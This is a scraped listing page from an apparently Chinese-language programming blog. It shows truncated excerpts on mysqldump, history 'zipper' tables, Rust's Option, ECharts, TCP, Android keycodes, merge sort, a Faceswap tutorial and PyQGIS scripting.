const state = { isShowModal: false } const mutations = { setModalVisible(state, show) { state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4648630783fba92ece5883f2332f1cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6b2827fb7a002deb2aab963d55e32da/" rel="bookmark">
			Mysql的mysqldump详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抄录自：https://www.cnblogs.com/flagsky/p/9762726.html
一、导出
1.1 导出表结构及数据
mysqldump -uroot -p --set-gtid-purged=OFF database table1 table2 &gt; mysqldump.sql 1.2 只导出表结构
mysqldump -uroot -p --set-gtid-purged=OFF -d database table1 table2 &gt; mysqldump.sql 1.3 只导出数据
mysqldump -uroot -p --set-gtid-purged=OFF -t database table1 table2 &gt; mysqldump.sql
1.4 导出单张表 (1)导出表结构及数据（有where条件）
mysqldump -uroot -p --set-gtid-purged=OFF database table --where "限制条件" &gt; mysqldump.sql
(2)只导出数据（有where条件）
mysqldump -uroot -p --set-gtid-purged=OFF --no-create-info database table --where "限制条件" &gt; mysqldump.sql
参数说明：
-d参数：等价于-–no-data，含义是不导出任何数据，只导出数据库表结构；
-t参数：等价于—no-create-info，含义是只导出数据，而不添加CREATE TABLE语句；
2、导出数据库
2.1 导出所有数据库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6b2827fb7a002deb2aab963d55e32da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b0200d2df2a9455557ef6396f1fdfa8/" rel="bookmark">
			拉链表--实现、更新及回滚的具体实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 背景
本文前面的内容时参考了'lxw的大数据田地',具体可查看最后的'参考文章'，个人加入了'拉链表的回滚'部分的内容sql，如果有实践的，可以互相交流学习，谢谢
在数据仓库的数据模型设计过程中，经常会遇到这样的需求：
1.1 数据量比较大;
1.2 表中的部分字段会被update,如用户的地址，产品的描述信息，订单的状态等等;
1.3 需要查看某一个时间点或者时间段的历史快照信息，比如，查看某一个订单在历史某一个时间点的状态，比如，查看某一个用户在过去某一段时间内，更新过几次等等;
1.4 变化的比例和频率不是很大，比如，总共有1000万的会员，每天新增和发生变化的有10万左右;如果对这边表每天都保留一份全量，那么每次全量中会保存很多不变的信息，对存储是极大的浪费;
综上所述：引入'拉链历史表'，既能满足反应数据的历史状态，又可以最大程度的节省存储;
2 具体表结构
2.1 例如
有一张订单表,6月20号有3条记录：
订单创建日期订单编号订单状态2012-06-20001创建订单2012-06-20002创建订单2012-06-20003支付完成 到6月21日，表中有5条记录：
订单创建日期订单编号订单状态2012-06-20001支付完成（从创建到支付）2012-06-20002创建订单2012-06-20003支付完成2012-06-21004创建订单2012-06-21005创建订单 到6月22日，表中有6条记录：
订单创建日期订单编号订单状态2012-06-20001支付完成（从创建到支付）2012-06-20002创建订单2012-06-20003已发货（从支付到发货）2012-06-21004创建订单2012-06-21005支付完成（从创建到支付）2012-06-22006创建订单 2.2 常用的解决方案以及存在的问题：
1 快照表：只保留一份全量，则数据和6月22日的记录一样，如果需要查看6月21日订单001的状态，则无法满足；
2 全量历史表：每天都保留一份全量，则数据仓库中的该表共有14条记录，但好多记录都是重复保存，没有任务变化，如订单002,004，数据量大了，会造成很大的存储浪费；
2.3 如果在数据仓库中设计成历史拉链表保存该表，则会有下面这样一张表：
订单创建日期订单编号订单状态dw_begin_datedw_end_date2012-06-20001创建订单2012-06-202012-06-202012-06-20001支付完成2012-06-219999-12-312012-06-20002创建订单2012-06-209999-12-312012-06-20003支付完成2012-06-202012-06-212012-06-20003已发货2012-06-229999-12-312012-06-21004创建订单2012-06-219999-12-312012-06-21005创建订单2012-06-212012-06-212012-06-21005支付完成2012-06-229999-12-312012-06-22006创建订单2012-06-229999-12-31 说明：
2.3.1 dw_begin_date表示该条记录的生命周期开始时间（周期快照时的状态），dw_end_date表示该条记录的生命周期结束时间；
2.3.2 dw_end_date = '9999-12-31'表示该条记录目前处于有效状态；
2.3.3 如果查询当前所有有效的记录，则select * from order_his where dw_end_date = '9999-12-31'
2.3.4 如果查询2012-06-21的历史快照，则select * from order_his where dw_begin_date &lt;= '2012-06-21' and end_date &gt;='2012-06-21'，这条语句会查询到以下记录：
订单创建日期订单编号订单状态dw_begin_datedw_end_date2012-06-20001支付完成2012-06-219999-12-312012-06-20002创建订单2012-06-209999-12-312012-06-20003支付完成2012-06-202012-06-212012-06-21004创建订单2012-06-219999-12-312012-06-21005创建订单2012-06-212012-06-21 和源表在6月21日的记录完全一致：
订单创建日期订单编号订单状态2012-06-20001支付完成（从创建到支付）2012-06-20002创建订单2012-06-20003支付完成2012-06-21004创建订单2012-06-21005创建订单 可以看出，这样的历史拉链表，既能满足对历史数据的需求，又能很大程度的节省存储资源；
3 拉链表更新方案
假设：
3.1 前提：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b0200d2df2a9455557ef6396f1fdfa8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b2a2e155da1ddd2e8dd90eee8d794d0/" rel="bookmark">
			python怎么写接口_python如何写接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，我们必须明确的一点是：python里无接口类型，定义接口只是一个人为规定，在编程过程自我约束。
python的类是可以写任意个方法的
定义一个接口对继承类进行约束，接口里有什么方法，继承类就必须有什么方法，接口中不能任何功能代码class Interface:
def f1(self):
'''
to do something
:return:
'''
class Something(Interface):
def f1(self):
print('to do something...')
def f2(self):
print('to do other..')
在其他的语言里，比如Java，继承类没有重写接口方法是会报错的，而在python里不会，就是因为python没这个类型，所以只是在我们编程过程的一个规定，以I开头的类视为接口class IOrderRepository:
def fetch_one_by(self,nid):
raise Exception('子类中必须实现该方法')
class Something(IOrderRepository):
def fet_one_by(self,nid):
print('查查查数据....')
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/924e7b05a1cc68bbd3dcc7efc6d38aa6/" rel="bookmark">
			select获取选中的option的值_Rust特殊枚举Option用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在上一节中，我们研究了IpAddr枚举如何使我们使用Rust的类型系统对更多信息进行编码，而不仅仅是将数据编码到程序中。本节探讨的案例研究Option，这是标准库定义的另一个枚举。Option类型在很多地方都使用，因为它对非常常见的情况进行编码，在这种情况下，值可以是某些值，也可以是任何值。用类型系统来表达这个概念意味着编译器可以检查您是否已经处理了所有您应该处理的情况。此功能可以防止其他编程语言中极为常见的错误。
通常会根据所包含的功能来考虑编程语言设计，但是所排除的功能也很重要。Rust没有许多其他语言具有的null功能。Null是一个值，表示那里没有任何值。在具有null的语言中，变量始终可以处于以下两种状态之一：null或非null。
null的发明者Tony Hoare在2009年的演讲“ Null References：十亿美元的错误”中说：
我称之为我的十亿美元错误。当时，我正在设计第一个全面的类型系统，以面向对象的语言进行引用。我的目标是确保所有对引用的使用都绝对安全，并由编译器自动执行检查。但是我无法抗拒引入空引用的诱惑，仅仅是因为它是如此容易实现。这导致了无数错误，漏洞和系统崩溃，在最近四十年中可能造成十亿美元的痛苦和破坏。
空值的问题在于，如果您尝试将空值用作非空值，则会出现某种错误。由于此null或not-null属性无处不在，因此很容易产生这种错误。
但是，null试图表达的概念仍然是一个有用的概念：null是当前由于某种原因而无效或不存在的值。
问题不在于概念，而在于特定的实现。这样，Rust没有空值，但是它确实有一个枚举，该枚举可以编码存在或不存在的值的概念。该枚举是 Option，由标准库 定义如下：
enum Option { Some(T), None,} Option枚举是非常有用，它甚至包括中拉开序幕; 您无需将其明确纳入范围。此外，这样是它的变体：你可以使用Some和None直接不带Option::前缀。该 Option枚举仍然只是一个普通的枚举，并Some(T)和None类型仍然变种Option。
语法是，我们还没有谈到尚Rust的特点。这是一个泛型类型参数，我们将在第10章中更详细地介绍泛型。现在，您只需要知道，这意味着枚举的Some变体 Option可以容纳任何类型的数据。以下是一些使用Option值保存数字类型和字符串类型的示例：
let some_number = Some(5); let some_string = Some("a string"); let absent_number: Option = None; 如果使用None而不是Some，则需要告诉RustOption我们拥有哪种类型 ，因为编译器无法Some 通过仅查看一个None值来推断该变量将拥有的类型。
当我们拥有一个Some值时，我们知道存在一个值并将该值保存在内Some。None从某种意义上说，当我们拥有一个值时，它与null含义相同：我们没有一个有效的值。那么，为什么有 Option比没有更好呢？
简而言之，因为Option和T(T可以是任何类型)是不同的类型，所以编译器不会让我们使用Option值，就好像它绝对是有效值一样。例如，此代码不会编译，因为它正在尝试向中添加i8一个Option：
let x: i8 = 5; let y: Option = Some(5); let sum = x + y; 如果运行此代码，则会收到如下错误消息：
$ cargo run Compiling enums v0.1.0 (file:///projects/enums)error[E0277]: cannot add `std::option::Option` to `i8` --&gt; src/main.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/924e7b05a1cc68bbd3dcc7efc6d38aa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0defd7aa6bb131817065c7603724c85/" rel="bookmark">
			python回归分析波士顿房价_31_手把手教你学Python之波士顿房价预测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		波士顿房价预测问题简介
问题描述：波士顿房价数据集统计的是20世纪70年代中期波士顿郊区房价的中位数，统计了城镇人均犯罪率、不动产税等共计13个指标，统计出房价，试图能找到那些指标与房价的关系。数据集中一共有506个样本，每个样本包含13个特征信息和实际房价，波士顿房价预测问题目标是给定某地区的特征信息，预测该地区房价，是典型的回归问题（房价是一个连续值）。波士顿房价数据集中主要的指标名称及其含义如下。
机器学习库scikit-learn中自带了波士顿房价数据集，可直接加载。房价预测可采用线性回归算法。
线性回归算法
线性回归是利用数理统计中回归分析，来确定两种或两种以上变量间相互依赖的定量关系的一种统计分析方法，通过属性的线性组合进行预测的线性模型，其目的是找到一条直线或者一个平面或者更高维的超平面，使得预测值与真实值之间的误差最小化。
线性回归分析中，如果只包括一个自变量和一个因变量，且二者的关系可用一条直线近似表示，这种回归分析称为一元线性回归分析。如果包括两个或两个以上的自变量，且因变量和自变量之间是线性关系，则称为多元线性回归分析。线性回归算法的公式如下，xi表示样本，可以是多维的，w为系统矩阵，b为偏置。目标是学习w和b两个参数，使得计算结果和真实结果之间的误差最小。
直接调用scikit-learn中的相关函数，实现波士顿房价简单预测的代码如下，主要步骤包括：加载数据
划分训练集和测试集
创建线性回归模型
拟合训练数据
得到预测结果
计算相应的评测指标
这里主要是给大家演示了下机器学习库中相关函数的调用，并没有对数据进行分析，接下来通过数据可视化技术来分析单个指标与房价之间的关系。关键代码如下：
各个指标与房价之间的关系可视化效果如下：
通过可视化图表分析，可以看到不同特征的取值范围有较大差异，有些取值范围从0到1，有些从1到100，还有0到400等等，为了消除不同量纲的影响，可对数据进行标准化处理。一般采用将数据减去数据组的平均数再除以标准差。z = (x - u) / s （u表示均值，s表示标准差）
此外，通过图表效果可知，部分指标与房价之间存在明显的线性关系（例如RM、LSTAT等），而有些指标与房价之间的关系则不那么明显（例如CHAS、B等）。可调用机器学习库中相关方法获取最相关的特征，关键代码如下：（首先对数据进行标准化，然后获取最相关的3个特征）
选择最相关的三个特征，结果为： RM、LSTAT、PTRATIO
最后使用最相关的特征数据进行房价的预测，关键代码如下：
将预测结果和真实结果画在同一个图上，如下图所示，可以清楚的看到它们之间的关系。
思考：通过预测值和真实值对比，可知有一些异常点，如何去除这些异常点？例如删除房价为50的样本。
更多Python学习资料请加入群、联系助理老师或关注微信公众号获取，我们会不定期更新！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d5c55ca79e620904a1720056473da9d/" rel="bookmark">
			echarts图表不显示_Echarts入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开“Apache ECharts (incubating)”官网，下载
下载echarts.js文件。
准备个web工具，HBuilder.exe，新建web项目，将下载的echarts.js文件，复制过来。
开始体验画图。参照官网案例，可复制案例代码，做更改，实现快速作图。
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;title&gt;echart_example&lt;/title&gt;
&lt;script src="js/echarts.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;!-- 为 ECharts 准备一个具备大小（宽高）的 DOM --&gt;
&lt;div id="main" style="width: 600px;height:400px;"&gt;&lt;/div&gt;
&lt;script type="text/javascript"&gt;
// 基于准备好的dom，初始化echarts实例
var myChart = echarts.init(document.getElementById('main'));
// 指定图表的配置项和数据
var option = {
title: {
text: 'ECharts 入门示例'
},
tooltip: {},
legend: {
data:['销量','price']
},
xAxis: {
data: ["衬衫","羊毛衫","雪纺衫","裤子","高跟鞋","袜子"]
},
yAxis: {},
series: [{
name: '销量',
type: 'bar',
label:{show:true,position:'outside'},
data: [5, 20, 36, 10, 10, 20]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d5c55ca79e620904a1720056473da9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73cddfb9fc9263c3353e4d1524217ab9/" rel="bookmark">
			echarts formatter_Echarts 踩坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语：近日在项目中需要用到echarts图表，因为是第一次使用echarts图表画图，所以也遇到很多坑；特意整理总结了一下，希望对小伙伴有帮助
项目是用vue-cli搭建，使用的quasar框架 1.tooltip(提示框) 提示框的样式数据和样式修改
因为项目中的图数据是区间的数据差，例如：'+99.9' = '+99' + '+95' ; [+99.9,+99,+95] = [5,3,2]
所以在'series':[{ 'type': 'bar',
'barWidth': this.bar_width,
'barGap': '-50%',
'stack': '指标范围',
'silent': true,
'name': '-95',
'data': this.sci.ciData['+95'],
'itemStyle': {
'color': '#174496'
}
}]中的数据都是区间，但是我们在提示框中数据肯定需要一个确切的数据，而不是一个区间的数据；但是我们tooltip 中默认的数据是从series中拿到的数据片段，所以这个时候我们需要将series中data进行改写
注意：series类目中没有加data属性的，在tooltip中是拿不到data的 数据，这个在后面legend可以用到；
tooltip中的formatter属性可以修改提示框中数据和样式 tooltip:{ formatter: function (params){ console.log(params) // 如下图打印 } } 2.因为我的需求是渲染不同的图表，所以我把图表做成了子组件，就会出现请求不同的数据会渲染不同的图表
大坑：只渲染第一个图表，但是父组件图表的数据已经拿到了，但是页面没有渲染
原因是子组件没有渲染DOM，也就是没有初始化，所以这个时候我们就要手动让每个子组件图表重新初始化一次，只需要在init中加入this.echart.resize
3.legend显示与series中显示不同的问题
官方给的是data默认取得是series.name或者是series.encode的seriesName,但是我们想要的legend并不需要series.name 如下图 红框：legend显示的图例；黄色框是series.name值，显然不同，所以我们需要设计；
首先我们在legend.data中声明我们想要的图例名
legend:{
'data':[{name:avg},{name:n},{name:95%},{name:99%},{name:99.9%}]
}
如果series中有我们声明的name，如avg,n等就不需要重复声明，但是像95%，99%，99.9%没有声明的，我们需要在series中声明，但是不需要声明data属性
4.直角坐标轴Y轴， Y轴设置显示数据为百分比， 配置 yAxis属性中的 axisLabel 里的 formatter: '{value} %' ，如果想Y轴不显示数据 formatter: function(){ return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73cddfb9fc9263c3353e4d1524217ab9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aa8976cd7ba9aad5ff050bc05482c99/" rel="bookmark">
			怎么找出电脑里隐藏的流氓软件_隐藏的文件怎么找出来？找出隐藏的文件方法和步骤介绍...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着信息技术和网络技术的进步，人们的生活、工作、学习等活动越来越离不开计算机。对于经常使用电脑的人来说，在电脑上创建文件是最基本的技能之一。然而，在很多情况下，我们创建或编写的文件被划分为重要或私有，我们不想让别人看到或发现它们。此时，我们可以使用一些设置隐藏文件。
如何找到隐藏的文件？
隐藏文件，是计算机应用过程中的一种文件保护技巧。它可以防止某些重要或私有文件被其他人看到或发现。但是当我们需要查找隐藏文件时，我们应该使用什么方法和步骤来查找它们呢？winxp为例做一个教程分享给你大家
找到隐藏文件的步骤如下：
第一步：正确启动电脑。打开电脑后，双击鼠标左键打开桌面状态的“我的电脑”。
第二步：在屏幕上出现的“my computer”窗口中，在菜单栏中找到“tools”选项，点击鼠标左键，在“tools”下拉菜单中找到“folder options”，打开。
第三步：此时，屏幕上会弹出“文件夹选项”窗口。找到窗口顶部的“view”选项卡，点击“view”选项卡进入“view”界面。
第四步：在文件夹选项窗口的视图屏幕中，找到高级设置栏。在“高级设置”栏中找到“隐藏文件和文件夹”选项，双击鼠标左键。两个子选项将出现在“隐藏文件和文件夹”(“不显示隐藏的文件和文件夹”和“显示所有文件和文件夹”)下。选择“显示所有文件和文件夹”选项，然后在“文件夹选项”窗口底部左键单击“确定”。
第五步：回到“我的电脑”窗口，找到隐藏文件的位置，查看隐藏文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daa1e2ac6c2c19f026a558e44a618788/" rel="bookmark">
			Faceswap使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​ 最近刚好接触深度学习的一些项目，又比较清闲，所以研究了一下faceswap的使用。faceswap可以用来实现换脸，由于并非专业学习，具体原理没有做深入研究，仅仅做了两天，了解了一下使用过程，在这里做个记录。
写在前面 ​ 我这里用的是linux云服务器，个人windows笔记本、台式机也可以，大同小异。个人亲测阿里云学生服务器1核2GB运行不了，训练过程中总会终止。服务器这一块大家自行准备，这里仅供参考。如果有人阿里云学生服务器成功了可以评论交流一下。
​ 现在时间是2020.11.29。faceswap会不断更新，可能不同时间略有差异。
faceswap安装 这里没什么好说的，直接github下载就可以了：
git clone https://github.com/deepfakes/faceswap 下载后放到faceswap目录下。如果太慢可以考虑手动下载。
准备数据集 人物图像收集 ​ 这里用了个简单的python爬虫爬取的百度图片。代码网上很多，可以自行搜索。我这里用的是
https://blog.csdn.net/qq_40774175/article/details/81273198 这位作者的代码，表示感谢。我这里爬取了两个人的图像，每人1000张左右，分别放在两个/data/liu 和 data/ma下。
人脸提取 # 提取人物A的人脸 python faceswap.py extract -i ../data/liu/ -o ../data/liu/face # 提取人物B的人脸 python faceswap.py extract -i ../data/ma/ -o ../data/ma/face # -i -o 后分别为输入图片的相对路径和对应的输出人脸的相对路径 这里可能会报错，提示你缺少各种包，总之缺什么装什么就可以了。
人脸提取完后会在data/liu和data/ma下会生成一个face文件夹和一个alignments.fsa文件。
face存放提取到的对应人物的人脸。alignments.fsa保存了人脸的各种信息 这里注意：
​ 提取完后需要将alignments.fsa文件移动到或者复制face文件夹下才可训练，否则训练会提示缺少文件。
​ 至此，数据集准备完毕。
训练模型 切换到下载的faceswap文件夹下，会发现很多文件，不需要管，执行以下命令开始训练
python faceswap.py train -A ../data/liu/facet -B ../data/ma/face -m ./models/ # -A -B 后为人脸A和人脸B的相对路径，-m后为模型保存的相对路径 这里注意：
以上命令的顺序为将A的脸换为B。训练所用数据为提取后的人脸，并非原人物图片。 ​ 模型训练过程中会不断输出loss值，一般在0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/daa1e2ac6c2c19f026a558e44a618788/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f165d140ca6af5e1d49289935f772b4/" rel="bookmark">
			TCP 协议详解和知识点整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP 概念 TCP 属于网络分层中的传输层协议，介于会话层和网络层中间TCP 协议是用于主机到主机的通信协议，是面向连接的端到端的可靠协议，提供可靠字节流传输和对上层应用提供连接服务TCP 主要通过检验和、序列号、确认应答、重发控制、连接管理以及窗口控制等机制来实现可靠性TCP 对字节流的内容不作任何解释，对字节流的解释由 TCP 连接双方的应用层进行解释TCP 连接的建立和关闭的过程通过三次握手和四次挥手实现，具体细节可以参考上一篇文章TCP 连接状态及相关命令学习 TCP 和 UDP 的区别 TCP 是面向连接的、可靠的流协议，通过“顺序控制”或“重发控制”等来提高可靠性UDP 是不具有可靠性的数据报协议，虽然可以确保发送消息的大小，却不能保证消息一定会到达，需要应用层根据自己的需要进行重发处理TCP 用于在传输层有必要实现可靠传输的情况，UDP 主要用于那些对高速传输和实时性有较高要求的通信或广播通信 端口号 端口号用来识别同一台主机中进行通信的不同应用程序传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序，并准确地将数据传输IP 地址 + 端口号 + 协议来唯一识别一个应用程序，也就是不同的协议可以使用相同的端口知名端口号：分布在 0~1023 之间，例如 HTTP、FTP、TELNET 等广为使用的应用协议中所使用的端口号就是固定的端口号在 1024~49151 之间，这些端口号可以用于任何的通信用途一般情况下服务器需要确认端口号，但是客户端在连接服务端时完全不用用户自己指定，由操作系统动态分配 49152~65535 之间的端口号 TCP 的连接队列 正等待连接请求的一端有一个固定长度的连接队列，该队列中保存着已被 TCP 接受的连接（即三次握手已经完成），但还没有被应用层所接受TCP 每接受一个连接，也就是完成三次握手就将其放入这个队列，而应用层每接受一个连接时将其从该队列中移出应用层将指明该队列的最大长度，这个值通常称为积压值(backlog)，它的取值范围是 0~5 之间的整数当一个连接请求（即 SYN ）到达时，该 TCP 监听端口的连接队列中还有空间，TCP 模块将对 SYN 进行确认并完成连接的建立如果对于新的连接请求，连接队列中已没有空间，TCP 将不理会收到的 SYN，也不发回任何报文段（即不发回 RST），客户的主动打开最终将超时 MSS(Maximum Segment Size) 在建立 TCP 连接的同时会计算两端之间的传输的数据包大小，该数据包的大小被称其为 MSS（最大消息长度）MSS 的大小不包含 TCP Header 和 TCP Option，只包含 TCP Payload最理想的情况是，MSS 正好是 IP 中不会被分片处理的最大数据长度，减少 IP 层数据分片和重传的消耗TCP 在传送大量数据时，是以 MSS 的大小将数据进行分割发送，进行重发时也是以 MSS 为单位两端的主机在发出建立连接的请求时，会在 TCP 首部中写入 MSS 选项，告诉对方自己的接口能够适应的 MSS 的大小，然后会在两者之间选择一个较小的值进行使用 通信序列号 序列号是按照顺序给发送数据的每一个字节（8位字节）都标上号码的编号接收端查询接收数据 TCP 首部中的序列号和数据的长度，将自己下一步应该接收的序列号作为确认应答发送回去通过序列号和确认应答号，TCP 能够识别是否已经接收数据，又能够判断是否需要接收，从而实现可靠传输为了解决序列号冲突问题，TCP 每个连接都从不同的序列号开始，这个序号的起始序号是随着时间而变化的 TCP 标志位 TCP 报头信息中有六个控制位：URG，ACK，PSH，RST，SYN，FIN：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f165d140ca6af5e1d49289935f772b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90b0b541eacac1c0cade35ea341b3647/" rel="bookmark">
			Android 按键名和键值表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		appium使用的方法：press_code
电话键 按键名中文名codeKEYCODE_CALL拨号键5KEYCODE_EKDCALL挂机键6KEYCODE_HOMEHOME键3KEYCODE_MENU菜单键82KEYCODE_BACK返回键4KEYCODE_SEARCH搜索键84KEYCODE_CAMERA拍照键27KEYCODE_FOCUS拍照对焦键27KEYCODE_POWER电源键26KEYCODE_NOTIFICATION通知键83KEYCODE_MUTE话筒静音键91KEYCODE_VOLUME_MUTE扬声器静音键164KEYCODE_VOLUME_UP音量增加键24KEYCODE_VOLUME_DOWN音量减少键25 控制键 按键名中文名codeKEYCODE_ENTER回车键66KEYCODE_ESCAPEESC键111KEYCODE_DPAD_CENTER导航键 确定键23KEYCODE_DPAD_UP导航键 向上19KEYCODE_DPAD_DOWN导航键 向下20KEYCODE_DPAD_LEFT导航键 向左21KEYCODE_DPAD_RIGHT导航键 向右22KEYCODE_MOVE_HOME光标移动到开始键122KEYCODE_MOVE_END光标移动到结束键123KEYCODE_PAGE_UP向上翻页键92KEYCODE_PAGE_DOWN向下翻页键93KEYCODE_DEL退格键67KEYCODE_FORWARD_DEL删除键112KEYCODE_INSERT插入键124KEYCODE_TABTAB键61KEYCODE_NUM_LOCK小键盘锁143KEYCODE_CAPS_LOCK大写锁定键115KEYCODE_BREAKBREAK/pause键121KEYCODE_SCROLL_LOCK滚动锁定键116KEYCODE_ZOOM_IN放大键168KEYCODE_ZOOM_OUT缩小键169 组合键 按键名中文名codeKEYCODE_ALT_LEFTALT+LIFTKEYCODE_ALEERT_RIGHTALT_RIGHTKEYCODE_CTRL_LEFTcontrol_leftKEYCODE_CTRL_RIGHTcontrol_rightKEYCODE_SHIFT_LEFTShift+LeftKEYCODE_SHIFT_RIGHTshift+right 基本 按键名中文名codeKEYCODE_0按键’0’7KEYCODE_1按键’1’8KEYCODE_2按键’2’9KEYCODE_3按键’3’10KEYCODE_4按键’4’11KEYCODE_5按键’5’12KEYCODE_6按键’6’13KEYCODE_7按键’7’14KEYCODE_8按键’8’15KEYCODE_9按键’9’16KEYCODE_A按键’A’29KEYCODE_B按键’B’30KEYCODE_C按键’C’31KEYCODE_D按键’D’32KEYCODE_E按键’E’33KEYCODE_F按键’F’34KEYCODE_G按键’G’35KEYCODE_H按键’H’36KEYCODE_I按键’I’37KEYCODE_J按键’J’38KEYCODE_K按键’K’39KEYCODE_L按键’L’40KEYCODE_M按键’M’41KEYCODE_N按键’N’42KEYCODE_O按键’O’43KEYCODE_P按键’P’44KEYCODE_Q按键’Q’45KEYCODE_R按键’R’46KEYCODE_S按键’S’47KEYCODE_T按键’T’48KEYCODE_U按键’U’49KEYCODE_V按键’V’50KEYCODE_W按键’W’51KEYCODE_X按键’X’52KEYCODE_Y按键’Y’53KEYCODE_Z按键’Z’54 符号 按键名中文名codeKEYCODE_PLUS按键’+’KEYCODE_MINUS按键’-’KEYCODE_STAR按键’*’KEYCODE_SLASH按键’/’KEYCODE_EQUALS按键’=’KEYCODE_AT按键’@’KEYCODE_POUND按键’#’KEYCODE_APOSTROPHE按键’’’ 单引号KEYCODE_BACKSLASH按键’’KEYCODE_COMMA按键’,’KEYCODE_PERIOD按键’.’KEYCODE_LEFT_BRACKET按键’[’KEYCODE_RIGHT_BRACKET按键’]’KEYCODE_SEMICOLON按键’;’KEYCODE_GRAVE按键’`’KEYCODE_SPACE空格键 https://blog.csdn.net/mazhidong/article/details/79567306?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2allsobaiduend~default-1-79567306.nonecase&amp;utm_term=%E7%BB%84%E5%90%88%E9%94%AE%E9%94%AE%E5%80%BC%E5%A4%A7%E5%85%A8&amp;spm=1000.2123.3001.4430
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed84f6e4d730a17da9daf5fd81e8c97b/" rel="bookmark">
			二分归并排序算法_数据结构与算法 —— 归并排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是无量测试之道的第161篇原创 今天讲的内容是归并排序，为了比较容易的理解归并排序，我们首先看一道leetcode的算法题，通过该题的解题思路，会让我们更加容易的理解归并排序的思想。 开篇问题 这个题的解题思路其实就是归并排序的merge的过程。首先让我们先解这道题，便于后面更好的理解归并排序的思想。
首先我绘制了一张图，接下来我们通过上图来理解这道题的解题思路。
在开始之前，我先解释下上图的变量的含义：我们定义一个数组array = nums1 + nums2,然后定义指针T指向nums1的第一个元素的位置；此外，我们还定义了li(即left_index)和le(left_endIndex)以及ri、re。
思路： 通过实际的数据，我们来走一遍流程，暂时不用去考虑特殊情况，理解好整体的思路后再去考虑细节和特殊情况。
通过比较nums1[li] 和nums2[ri] 的大小，如果nums1[li] &gt; nums2[ri],则array[T] = nums2[ri],然后ri++, T++; 如果nums1[li] &lt; nums2[ri],则array[T] = nums2=1[li],然后li++, T++;一直重复上述过程，直到li &gt; le 或者 ri &gt; re 就结束
实际的数据走一遍流程： 1. 1 &lt; 2 , T = 0,所以 array[T] = 1, li++, T++
2. 2 == 2, T = 1,所以 array[T] = 2, li++, T++
3. 3 &gt; 2 , T = 2,所以 array[T] = 2, ri++, T++
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed84f6e4d730a17da9daf5fd81e8c97b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e21ea0697647fbe8225d21ef0216dc5/" rel="bookmark">
			python脚本编写_【PyQGIS】编写用于处理框架（QGIS3）的Python脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可以编写可通过QGIS中的Python控制台运行的独立pyqgis脚本。进行一些调整，即可使您的独立脚本通过处理框架运行。这具有几个优点。首先，获取用户输入和写入输出文件要容易得多，因为Processing Framework为这些提供了标准化的用户界面。其次，将脚本放入“处理工具箱”中还可以使其成为任何“处理模型”的一部分，或作为具有多个输入的批处理作业运行。本教程将展示如何编写自定义python脚本，该脚本可以作为QGIS中Processing框架的一部分。
注意
在QGIS3中彻底修改了Processing API。请参考本指南以获取最佳做法和提示。
任务概述 我们的脚本将根据用户选择的字段执行溶解操作。它还将为溶解的特征求和另一个字段的值。在示例中，我们将基于CONTINENT属性分解世界shapefile并求和POP_EST字段以计算溶解区域中的总人口。
